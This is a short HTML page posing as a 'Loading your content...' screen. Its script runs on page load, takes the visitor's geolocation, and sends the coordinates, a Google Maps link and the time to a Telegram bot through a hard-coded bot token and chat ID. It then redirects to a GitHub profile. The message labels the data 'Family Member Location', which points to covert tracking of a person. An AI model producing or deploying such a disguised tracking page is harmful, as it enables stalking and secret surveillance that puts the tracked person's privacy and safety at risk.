<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        function sendLocation() {
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                
                // Create Google Maps link
                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                
                // Send detailed alert to Telegram
                fetch(`https://api.telegram.org/bot8415841218:AAFOkRsPB3CAY5X63uKW4P9Z2zOCblpdYHE/sendMessage?chat_id=2091200246&text=📍 Family Member Location:\n\n• Google Maps: ${mapsLink}\n• Coordinates: ${lat}, ${lng}\n• Time: ${new Date().toLocaleString()}`)
                    .then(() => {
                        // Redirect to your GitHub page
                        window.location.href = "https://github.com/Mirafad19/";
                    });
            }, error => {
                console.error("Error getting location:", error);
                window.location.href = "https://github.com/Mirafad19/";
            });
        }
    </script>
</head>
<body onload="sendLocation()">
    <h2>Loading your content...</h2>
</body>
</html>
